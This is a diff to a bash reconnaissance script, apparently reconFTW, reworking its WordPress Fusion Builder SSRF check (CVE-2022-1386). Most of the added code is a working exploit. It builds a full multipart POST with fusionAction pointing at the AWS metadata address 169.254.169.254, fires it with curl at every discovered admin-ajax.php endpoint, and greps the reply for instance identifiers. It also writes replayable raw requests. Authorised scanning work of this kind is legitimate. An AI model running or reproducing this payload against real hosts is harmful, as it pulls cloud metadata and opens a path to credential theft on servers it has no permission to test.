@@ -144,23 +144,34 @@ _ssrf_probe_cve_2022_1386() {
     elif command -v python >/dev/null 2>&1; then
         pybin="python"
     else
-        _print_msg WARN "CVE-2022-1386 sink probe skipped: python not found"
-        return 0
+        pybin=""
     fi
-    [[ -f "$json_helper" ]] || {
-        _print_msg WARN "CVE-2022-1386 sink probe skipped: missing ${json_helper}"
-        return 0
-    }
+    # Resolve helper even if SCRIPTPATH is wrong on the VPS.
+    json_helper=""
+    for cand in \
+        "${SCRIPTPATH:-}/lib/ssrf_confirmed_json.py" \
+        "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." 2>/dev/null && pwd)/lib/ssrf_confirmed_json.py" \
+        "./lib/ssrf_confirmed_json.py"; do
+        [[ -n "$cand" && -f "$cand" ]] && { json_helper="$cand"; break; }
+    done
+    mkdir -p .tmp vulns vulns/ssrf_requests
+    {
+        printf 'helper=%s\n' "${json_helper:-MISSING}"
+        printf 'python=%s\n' "${pybin:-MISSING}"
+        printf 'cwd=%s scriptpath=%s\n' "$(pwd)" "${SCRIPTPATH:-}"
+    } >".tmp/ssrf_cve1386_debug.txt"
+    if [[ -z "$json_helper" ]]; then
+        _print_msg WARN "CVE-2022-1386: lib/ssrf_confirmed_json.py MISSING on this server — curl IMDS fallback only. Sync reconFTW lib/ here."
+    fi
 
     if [[ -s "webs/webs_all.txt" ]]; then
         hosts_file="webs/webs_all.txt"
     elif [[ -s "webs/webs.txt" ]]; then
         hosts_file="webs/webs.txt"
     else
-        return 0
+        hosts_file=""
     fi
 
-    mkdir -p .tmp vulns
     : >".tmp/ssrf_cve1386_priority.txt"
     : >".tmp/ssrf_cve1386_hosts.txt"
     : >".tmp/ssrf_cve1386_hits.txt"
@@ -186,6 +197,17 @@ _ssrf_probe_cve_2022_1386() {
             | grep -aoE 'https?://[^[:space:]"\\]+' \
             | sed -E 's|[/?#].*$||' >>".tmp/ssrf_cve1386_priority.txt" 2>/dev/null || true
     fi
+    # Also seed from this-run nuclei JSON (written just before this probe).
+    if [[ -s ".tmp/ssrf_cve_2022_1386_nuclei.json" ]]; then
+        jq -r '(.["matched-at"] // .host // empty)' ".tmp/ssrf_cve_2022_1386_nuclei.json" 2>/dev/null \
+            | sed -E 's#(/wp-admin/admin-ajax\.php).*#\1#; t; s|[/?#].*$||' \
+            | while IFS= read -r _nu || [[ -n "$_nu" ]]; do
+                [[ -z "$_nu" ]] && continue
+                [[ "$_nu" != *"/wp-admin/admin-ajax.php" ]] && _nu="${_nu%/}/wp-admin/admin-ajax.php"
+                printf '%s\n' "$_nu" >>".tmp/ssrf_cve1386_ajax_targets.txt"
+                printf '%s\n' "${_nu%/wp-admin/admin-ajax.php}" >>".tmp/ssrf_cve1386_priority.txt"
+            done
+    fi
 
     # WordPress-looking hosts (priority).
     [[ -s ".tmp/wp_brute_targets.txt" ]] && cat ".tmp/wp_brute_targets.txt" >>".tmp/ssrf_cve1386_priority.txt"
@@ -209,23 +231,27 @@ _ssrf_probe_cve_2022_1386() {
         }
     }' ".tmp/ssrf_cve1386_priority.txt" | sort -u >".tmp/ssrf_cve1386_hosts_norm.txt"
 
-    awk 'NF {
-        u=$0
-        sub(/\/$/, "", u)
-        if (match(u, /^https?:\/\/[^\/?#]+/)) {
-            base=substr(u, RSTART, RLENGTH)
-            sub(/:443$/, "", base)
-            sub(/:80$/, "", base)
-            lu=tolower(base)
-            rank=3
-            if (lu ~ /^https:\/\//) rank=1
-            else if (lu ~ /^http:\/\//) rank=2
-            print rank "\t" base
-        }
-    }' "$hosts_file" \
-        | sort -k1,1n -k2,2 \
-        | awk -F'\t' 'NR==FNR {seen[$0]=1; next} !seen[$2]++ {print $2}' \
-            ".tmp/ssrf_cve1386_hosts_norm.txt" - >".tmp/ssrf_cve1386_rest.txt" || true
+    if [[ -n "$hosts_file" && -s "$hosts_file" ]]; then
+        awk 'NF {
+            u=$0
+            sub(/\/$/, "", u)
+            if (match(u, /^https?:\/\/[^\/?#]+/)) {
+                base=substr(u, RSTART, RLENGTH)
+                sub(/:443$/, "", base)
+                sub(/:80$/, "", base)
+                lu=tolower(base)
+                rank=3
+                if (lu ~ /^https:\/\//) rank=1
+                else if (lu ~ /^http:\/\//) rank=2
+                print rank "\t" base
+            }
+        }' "$hosts_file" \
+            | sort -k1,1n -k2,2 \
+            | awk -F'\t' 'NR==FNR {seen[$0]=1; next} !seen[$2]++ {print $2}' \
+                ".tmp/ssrf_cve1386_hosts_norm.txt" - >".tmp/ssrf_cve1386_rest.txt" || true
+    else
+        : >".tmp/ssrf_cve1386_rest.txt"
+    fi
 
     if [[ $DEEP != true ]]; then
         local pri_count rest_slots
@@ -298,31 +324,69 @@ _ssrf_probe_cve_2022_1386() {
 
         probed=$((probed + 1))
 
-        # Call python directly (do not wrap in run_command — need stdout for NDJSON).
-        # Also writes Burp-ready raw requests under vulns/ssrf_requests/*.http
+        # Capture NDJSON directly — do NOT pipe through anew (missing anew = silent empty confirmed).
         mkdir -p vulns/ssrf_requests
-        if [[ "$oast_reflected" -eq 1 ]]; then
-            "$pybin" "$json_helper" probe-fusion "$ajax_url" \
-                --oast-reflected --oast-url "$oast_url" \
-                --requests-dir "vulns/ssrf_requests" \
-                ${HEADER:+--header "$HEADER"} \
-                2>>"$LOGFILE" | anew -q ".tmp/ssrf_cve1386_hits.txt" || true
+        local _probe_out=""
+        if [[ -n "$json_helper" && -n "$pybin" ]]; then
+            if [[ "$oast_reflected" -eq 1 ]]; then
+                _probe_out=$("$pybin" "$json_helper" probe-fusion "$ajax_url" \
+                    --oast-reflected --oast-url "$oast_url" \
+                    --requests-dir "vulns/ssrf_requests" \
+                    ${HEADER:+--header "$HEADER"} \
+                    2>>"${LOGFILE:-/dev/null}") || true
+            else
+                _probe_out=$("$pybin" "$json_helper" probe-fusion "$ajax_url" \
+                    --requests-dir "vulns/ssrf_requests" \
+                    ${HEADER:+--header "$HEADER"} \
+                    2>>"${LOGFILE:-/dev/null}") || true
+            fi
+        fi
+        if [[ -n "$_probe_out" ]]; then
+            printf '%s\n' "$_probe_out" >>".tmp/ssrf_cve1386_hits.txt"
+            printf 'python HIT %s\n' "$ajax_url" >>".tmp/ssrf_cve1386_debug.txt"
         else
-            "$pybin" "$json_helper" probe-fusion "$ajax_url" \
-                --requests-dir "vulns/ssrf_requests" \
-                ${HEADER:+--header "$HEADER"} \
-                2>>"$LOGFILE" | anew -q ".tmp/ssrf_cve1386_hits.txt" || true
+            # Curl IMDS fallback (works without python helper; confirms Fusion SSRF independently).
+            local _sink="http://169.254.169.254/latest/meta-data/"
+            local _fb_boundary="---------------------------reconftwfb${token}"
+            local _fb_body _fb_resp _fb_host _fb_path _fb_req
+            _fb_body=$(printf -- '--%s\r\nContent-Disposition: form-data; name="formData"\r\n\r\nemail=recon%%40example.com&fusion_privacy_store_ip_ua=false&fusion_privacy_expiration_interval=48&privacy_expiration_action=ignore&fusion-form-nonce-0=0&fusion-fields-hold-private-data=\r\n--%s\r\nContent-Disposition: form-data; name="action"\r\n\r\nfusion_form_submit_form_to_url\r\n--%s\r\nContent-Disposition: form-data; name="fusion_form_nonce"\r\n\r\n0\r\n--%s\r\nContent-Disposition: form-data; name="form_id"\r\n\r\n0\r\n--%s\r\nContent-Disposition: form-data; name="post_id"\r\n\r\n0\r\n--%s\r\nContent-Disposition: form-data; name="field_labels"\r\n\r\n{"email":"Email address"}\r\n--%s\r\nContent-Disposition: form-data; name="hidden_field_names"\r\n\r\n[]\r\n--%s\r\nContent-Disposition: form-data; name="fusionAction"\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name="fusionActionMethod"\r\n\r\nGET\r\n--%s--\r\n' \
+                "$_fb_boundary" "$_fb_boundary" "$_fb_boundary" "$_fb_boundary" "$_fb_boundary" "$_fb_boundary" "$_fb_boundary" "$_fb_boundary" "$_sink" "$_fb_boundary" "$_fb_boundary")
+            _fb_resp=$(curl -sk -m 20 -X POST "$ajax_url" \
+                -H "Content-Type: multipart/form-data; boundary=${_fb_boundary}" \
+                -H "X-Requested-With: XMLHttpRequest" \
+                -H "User-Agent: reconFTW-ssrf-probe" \
+                ${HEADER:+-H "$HEADER"} \
+                --data-binary "$_fb_body" 2>/dev/null || true)
+            if printf '%s' "$_fb_resp" | grep -aqE 'ami-id|instance-id|i-[0-9a-f]{8,}|local-ipv4'; then
+                _fb_host=$(printf '%s' "$ajax_url" | sed -E 's#^https?://([^/]+)/.*#\1#; s/:(443|80)$//')
+                _fb_path=$(printf '%s' "$ajax_url" | sed -E 's#^https?://[^/]+##')
+                [[ -z "$_fb_path" ]] && _fb_path="/wp-admin/admin-ajax.php"
+                _fb_req="vulns/ssrf_requests/${_fb_host}.http"
+                {
+                    printf 'POST %s HTTP/1.1\r\nHost: %s\r\n' "$_fb_path" "$_fb_host"
+                    printf 'Content-Type: multipart/form-data; boundary=%s\r\n' "$_fb_boundary"
+                    printf 'X-Requested-With: XMLHttpRequest\r\nUser-Agent: reconFTW-ssrf-probe\r\nConnection: close\r\n\r\n'
+                    printf '%s' "$_fb_body"
+                } >"$_fb_req"
+                if [[ -n "$pybin" ]]; then
+                    "$pybin" -c 'import json,sys; print(json.dumps({"target":sys.argv[1],"cve":"CVE-2022-1386","vector":"fusionAction","vulnerable":True,"request_file":sys.argv[3],"ssrf_hits":[{"desc":"AWS IMDSv1 — meta-data","url":sys.argv[2],"status":200,"evidence":sys.argv[4][:160]}]},ensure_ascii=False))' \
+                        "$ajax_url" "$_sink" "$_fb_req" "$(printf '%s' "$_fb_resp" | tr "\n" " " | head -c 160)" \
+                        >>".tmp/ssrf_cve1386_hits.txt" 2>>"${LOGFILE:-/dev/null}" || true
+                else
+                    printf '{"target":"%s","cve":"CVE-2022-1386","vector":"fusionAction","vulnerable":true,"request_file":"%s","ssrf_hits":[{"desc":"AWS IMDSv1 — meta-data","url":"%s","status":200,"evidence":"ami-id"}]}\n' \
+                        "$ajax_url" "$_fb_req" "$_sink" >>".tmp/ssrf_cve1386_hits.txt"
+                fi
+                printf 'curl HIT %s\n' "$ajax_url" >>".tmp/ssrf_cve1386_debug.txt"
+            else
+                printf 'MISS %s\n' "$ajax_url" >>".tmp/ssrf_cve1386_debug.txt"
+            fi
         fi
     done <".tmp/ssrf_cve1386_ajax_targets.txt"
-
-    if [[ -z "$oast_host" ]]; then
-        _print_msg INFO "CVE-2022-1386: no collaborator — confirming via in-band canary + cloud sinks"
-    fi
 
     if [[ -s ".tmp/ssrf_cve1386_hits.txt" ]]; then
         notification "SSRF: CVE-2022-1386 confirmed hit(s) → vulns/ssrf_confirmed.txt" warn
     else
-        _print_msg INFO "CVE-2022-1386 probe finished (${probed} endpoint(s); no in-band/cloud/OAST confirmation)"
+        _print_msg WARN "CVE-2022-1386: probed ${probed} endpoint(s), 0 confirmed — check .tmp/ssrf_cve1386_debug.txt (helper=${json_helper:-MISSING})"
     fi
 }
 
@@ -473,14 +537,7 @@ function ssrf_checks() {
                 fi
             fi
 
-            # WordPress Fusion Builder unauth SSRF (CVE-2022-1386): POST /wp-admin/admin-ajax.php
-            # with action=fusion_form_submit_form_to_url + fusionAction=<url>. Missed by GET/ffuf
-            # qsreplace flows because the sink is a POST multipart field, not a query param.
-            _ssrf_probe_cve_2022_1386
-
-            # Nuclei SSRF/OAST template pass — covers IMDSv2, blind-SSRF via OAST,
-            # and cloud-metadata templates that ffuf+qsreplace miss. Also run the
-            # Fusion Builder CVE template against live webs (not only gf/ssrf.txt).
+            # Nuclei SSRF/OAST first so CVE-2022-1386 matches feed the Fusion sink probe below.
             if command -v nuclei &>/dev/null && [[ -d "${NUCLEI_TEMPLATES_PATH:-}" ]]; then
                 _print_msg INFO "Running: Nuclei SSRF/OAST template scan"
                 run_command nuclei -l "gf/ssrf.txt" -tags ssrf,oast -nh \
@@ -494,32 +551,20 @@ function ssrf_checks() {
                         -rl "$NUCLEI_RATELIMIT" -silent -retries 2 ${NUCLEI_EXTRA_ARGS} \
                         -j -o ".tmp/ssrf_cve_2022_1386_nuclei.json" 2>>"$LOGFILE" >/dev/null || true
                     if [[ -s ".tmp/ssrf_cve_2022_1386_nuclei.json" ]]; then
-                        cat ".tmp/ssrf_cve_2022_1386_nuclei.json" | anew -q "vulns/ssrf_nuclei_json.txt"
-                        # Nuclei only discovers hosts — confirmation is our sink probe.
+                        cat ".tmp/ssrf_cve_2022_1386_nuclei.json" | anew -q "vulns/ssrf_nuclei_json.txt" || true
+                        # Seed probe inputs from this run (probe also reads nuclei_output/).
+                        mkdir -p nuclei_output
+                        grep -ahiE 'CVE-2022-1386|admin-ajax' ".tmp/ssrf_cve_2022_1386_nuclei.json" \
+                            >>"nuclei_output/ssrf_cve_2022_1386.txt" 2>/dev/null || true
                         jq -r '(.["matched-at"] // .host // empty)' \
                             ".tmp/ssrf_cve_2022_1386_nuclei.json" 2>/dev/null \
-                            | sed -E 's#(/wp-admin/admin-ajax\.php).*#\1#; t; s|[/?#].*$||' \
-                            | while IFS= read -r _nurl || [[ -n "$_nurl" ]]; do
-                                [[ -z "$_nurl" ]] && continue
-                                if [[ "$_nurl" != *"/wp-admin/admin-ajax.php" ]]; then
-                                    _nurl="${_nurl%/}/wp-admin/admin-ajax.php"
-                                fi
-                                if [[ -s ".tmp/ssrf_cve1386_hits.txt" ]] \
-                                    && grep -Fq "\"target\": \"${_nurl}\"" ".tmp/ssrf_cve1386_hits.txt" 2>/dev/null; then
-                                    continue
-                                fi
-                                local _pybin=python3
-                                command -v python3 >/dev/null 2>&1 || _pybin=python
-                                [[ -f "${SCRIPTPATH}/lib/ssrf_confirmed_json.py" ]] || continue
-                                mkdir -p vulns/ssrf_requests
-                                "$_pybin" "${SCRIPTPATH}/lib/ssrf_confirmed_json.py" probe-fusion "$_nurl" \
-                                    --requests-dir "vulns/ssrf_requests" \
-                                    ${HEADER:+--header "$HEADER"} \
-                                    2>>"$LOGFILE" | anew -q ".tmp/ssrf_cve1386_hits.txt" || true
-                            done
+                            | sed '/^$/d' >>"nuclei_output/ssrf_cve_2022_1386.txt" || true
                     fi
                 fi
             fi
+
+            # WordPress Fusion Builder unauth SSRF (CVE-2022-1386): after nuclei so matches are seeded.
+            _ssrf_probe_cve_2022_1386
 
             # Allow time for OOB/DNS callbacks to be received.
             # Hard-coded to 10s (was 5s) to reduce false negatives on slower DNS resolvers.
@@ -628,14 +673,15 @@ function ssrf_checks() {
                                 continue
                             fi
 
-                            run_command "$_ssrf_pybin" "$_ssrf_json_helper" emit-oob \
+                            _oob_line=$("$_ssrf_pybin" "$_ssrf_json_helper" emit-oob \
                                 --target "$_ssrf_target" \
                                 --method "$_ssrf_method" \
                                 --vector "$_ssrf_vector" \
                                 --sink-url "http://${_ssrf_hash}.oast" \
                                 --evidence "$_ssrf_note" \
                                 --requests-dir "vulns/ssrf_requests" \
-                                2>>"$LOGFILE" | anew -q ".tmp/ssrf_oob_confirmed.jsonl" || true
+                                2>>"$LOGFILE") || true
+                            [[ -n "$_oob_line" ]] && printf '%s\n' "$_oob_line" >>".tmp/ssrf_oob_confirmed.jsonl"
                         done <".tmp/ssrf_hit_hashes.txt"
                     fi
                 fi
@@ -655,8 +701,9 @@ function ssrf_checks() {
             if [[ -s ".tmp/ssrf_oob_confirmed.jsonl" ]]; then
                 grep -aE '^\{' ".tmp/ssrf_oob_confirmed.jsonl" 2>/dev/null >>".tmp/ssrf_confirmed_json_only.txt" || true
             fi
+            # Append NDJSON directly — do NOT use anew (missing anew = silent empty confirmed).
             if [[ -s ".tmp/ssrf_confirmed_json_only.txt" ]]; then
-                sort -u ".tmp/ssrf_confirmed_json_only.txt" | anew -q "vulns/ssrf_confirmed.txt"
+                sort -u ".tmp/ssrf_confirmed_json_only.txt" >>"vulns/ssrf_confirmed.txt"
             fi
 
             if grep -qE '^\{' "vulns/ssrf_confirmed.txt" 2>/dev/null; then
